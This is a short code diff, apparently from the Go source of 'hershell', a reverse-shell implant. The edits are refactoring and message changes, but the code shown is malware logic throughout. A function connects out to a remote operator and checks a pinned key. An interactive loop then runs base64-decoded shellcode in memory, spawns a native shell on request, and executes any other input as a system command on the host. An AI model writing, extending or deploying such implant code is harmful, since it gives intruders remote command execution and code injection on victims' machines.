@@ -28,10 +28,10 @@ var (
 
 func InteractiveShell(conn net.Conn) {
 	var (
-		exit   bool   = false
-		prompt string = "[hershell]> "
+		exit    bool           = false
+		prompt  string         = "[hershell]> "
+		scanner *bufio.Scanner = bufio.NewScanner(conn)
 	)
-	scanner := bufio.NewScanner(conn)
 
 	conn.Write([]byte(prompt))
 
@@ -42,23 +42,23 @@ func InteractiveShell(conn net.Conn) {
 			switch argv[0] {
 			case "inject":
 				if argv[1] != "" {
-					shellcode, err := base64.StdEncoding.DecodeString(argv[1])
-					if err == nil {
+					if shellcode, err := base64.StdEncoding.DecodeString(argv[1]); err == nil {
 						go shell.ExecShellcode(shellcode)
 					}
 				}
 			case "exit":
 				exit = true
-				break
 			case "run_shell":
-				conn.Write([]byte("Starting shell ...\n"))
+				conn.Write([]byte("Enjoy your native shell\n"))
 				RunShell(conn)
 			default:
 				shell.ExecuteCmd(command, conn)
 			}
+
 			if exit {
 				break
 			}
+
 		}
 		conn.Write([]byte(prompt))
 	}
@@ -99,7 +99,6 @@ func Reverse(connectString string, fingerprint []byte) {
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
-	//RunShell(conn)
 	InteractiveShell(conn)
 }
 
